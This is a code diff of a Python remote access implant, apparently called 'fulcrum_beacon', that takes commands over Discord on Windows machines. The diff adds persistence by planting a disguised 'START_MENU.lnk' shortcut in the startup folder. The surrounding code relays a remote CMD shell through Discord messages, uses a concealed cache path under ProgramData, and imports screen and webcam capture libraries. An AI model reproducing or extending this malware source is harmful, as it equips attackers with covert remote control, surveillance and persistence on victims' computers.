@@ -2,7 +2,6 @@ import os
 import subprocess
 import threading
 import asyncio
-from functools import partial
 import discord
 from dotenv import load_dotenv
 import ctypes
@@ -11,8 +10,9 @@ import wmi
 import time
 import cv2
 import mss
+import winshell
+from win32com.client import Dispatch
 from discord.ext import commands, tasks
-from datetime import datetime
 from PIL import Image
 
 FLAG_PATH = "C:\\ProgramData\\FUC Cache"
@@ -51,7 +51,7 @@ async def on_ready():   # sobald der client sich mit discord verbunden hat
     print("start up")
     if first_execution:
         print("first execution")
-        create_channel()
+        await create_channel()
     try:
         if not profile_data:
 
@@ -118,7 +118,7 @@ async def on_message(message):  # wenn discord message erkannt wird
                     shell=True
                 )
                 await channel.send("**CMD SHELL ACTIVE**")
-                await channel.send(f"*{os.getcwd()}*")
+                await channel.send(f"{os.getcwd()}")
 
         case "shell":
                 print(mode)
@@ -126,7 +126,7 @@ async def on_message(message):  # wenn discord message erkannt wird
                     mode = "default"
                     if shell_process:
                         shell_process.terminate()
-                        await channel.send("**CMD SHELL DEACTIVATED**")
+                        await channel.send("**CMD SHELL TERMINATED**")
                         return
 
                     await channel.send("**CMD SHELL TERMINATED**")
@@ -270,17 +270,25 @@ def check_flags():
     return False
 
 
-def get_persistence():
+def get_persistence():  # TODO
     # benutzten des windows user startup folders
     try:
-        with open("WINDOWS.bat", "w") as f:
-            if os.path.isfile(os.path.join(START_FOLDER, "fulcrum_beacon.py")):
-                f.write('@echo off /n{os.path.join(START_FOLDER, "fulcrum_beacon.py")}')
-            elif os.path.isfile(os.path.join(START_FOLDER, "fulcrum_beacon.exe")):
-                f.write('@echo off /n{os.path.join(START_FOLDER, "fulcrum_beacon.exe")}')
-    except Exception as e:
-        return_error_to_channel(e)
+        if os.path.isfile(os.path.join(INSTALL_PATH, "fulcrum_beacon.pyw")):
+            create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"), os.path.join(INSTALL_PATH, "fulcrum_beacon.pyw"))
+        elif os.path.isfile(os.path.join(INSTALL_PATH, "fulcrum_beacon.exe")):
+            create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"), os.path.join(INSTALL_PATH, "fulcrum_beacon.exe"))
 
+    except Exception as e:
+        print(e)
+
+
+def create_shortcut(shortcut_path, target_path):
+    print("create shortcut")
+    shell = Dispatch('WScript.Shell')
+    shortcut = shell.CreateShortcut(shortcut_path)
+    shortcut.TargetPath = target_path
+    shortcut.WorkingDirectory = os.path.dirname(target_path)
+    shortcut.save()
 
 def create_unique_profile():
     c = wmi.WMI()
